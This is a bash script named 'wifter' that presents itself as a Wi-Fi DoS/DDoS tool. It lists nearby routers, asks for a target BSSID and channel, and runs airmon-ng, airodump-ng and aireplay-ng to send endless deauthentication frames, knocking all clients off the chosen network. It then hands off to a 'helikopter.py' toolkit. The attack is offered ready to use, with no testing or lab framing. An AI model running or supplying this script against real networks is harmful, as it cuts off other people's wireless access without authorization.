#!/bin/bash

#STARTOFCODE

#colors used in this script
red="\e[31m"
cyan="\e[36m"
green="\e[32m"
yellow="\e[33m"
RESET="\e[00m"

clear


#function to check if user is rootUser
function isroot_user(){
    echo -e $red
    if [[ $EUID -ne 0 ]]; then
        sleep 2

        echo -e "Run This Script Under Root Previlages!\n"
        sleep 2
                echo -e 'Quitting...\n'
        sleep 2
        exit 1
    fi
}


#function to diplay banner
function wifter_banner(){
	echo -e $yellow && sleep 3
    echo -e "
           _  ______
 __      _(_)/ _(_) |_ ___ _ __
 \ \ /\ / / | |_| | __/ _ \ '__|
  \ V  V /| |  _| | ||  __/ |
   \_/\_/ |_|_| |_|\__\___|_|
                       BASH DOS | DDOS \n"
}



#function to display emoji
function wifiter_symbol(){
    echo -e $green && sleep 2
    echo "     (  (   O   )  )   "
    echo "           / \         "
    echo "          /   \        "
    echo -e '\n'
}


#function displaying main menu
function wifiter_menu(){
    echo -e $cyan && sleep 2
    echo "   ----------------------------------------------  "
    echo "  |              W  I  F  T  E  R                | "
    echo "   ----------------------------------------------  "
    echo "  |   [+] 1 -> Perform DOS Attack                | "
    echo "  |   [!] 0 -> Quit                              | "
    echo "  |______________________________________________| "
}


#fucntion to perform dos attack
function dos_attack(){
    echo -e $RESET
    echo -e '------------------------------ Dislaying Available Routers ------------------------------\n'
    sleep 2
    #command to display routers
    nmcli dev wifi
    echo -e "\n------------------------------------------------------------------------------------------\n"

    echo -e $cyan

    #taking bssid and chanel from user to perform dos attack
    read -p "[+] Enter BSSID of Router: " bssid
	read -p "[+] Enter Channel of Router: " channel
	sleep 1 && echo -e "\n"

    #displaying warnings and exceptions to User
    echo -e $red
    echo -e "[!] Wifi will be Unavailable!\n"
    sleep 2
    echo -e "[-] Press ( ctrl + c ) to Stop Attack!\n"
    sleep 2

    #fancy output
    echo -e $yellow
    echo -e "[+] Enabling Monitor Mode...\n"
    sleep 2
    echo -e "[+] De-Authenticating Devices...\n"
    sleep 2
    echo -e '[+] Starting Attack...\n'
    sleep 2

    echo -e $red
    echo "[!] DOS Started!"
    sleep 2

    #main attack on router
    #commands for dos attack
    airmon-ng start wlan0 > /dev/null
	airodump-ng --bssid $bssid --channel $channel wlan0mon > /dev/null & sleep 5 ; kill $!
	aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null

}


#main function from where execution of code starts
#all functions are called here
function __main__(){
    #callign functions
    isroot_user
    wifter_banner
    wifiter_symbol
    wifiter_menu

    sleep 2

    echo -e $cyan
    read -p 'Enter Option to Perform: ' opt

    if [ "$opt" == "1" ]; then
        dos_attack

    elif [ "$opt" == "0" ]; then
        echo -e $red

        sleep 2
        echo -e "Quitting...\nThanks For Using!"

        sleep 2
        exit 1
    fi
}

#calling main function
__main__
#ENDOFDOSCODE

#going back to maintoolkit
python helikopter.py
#ENDOFCOMPLETECODE
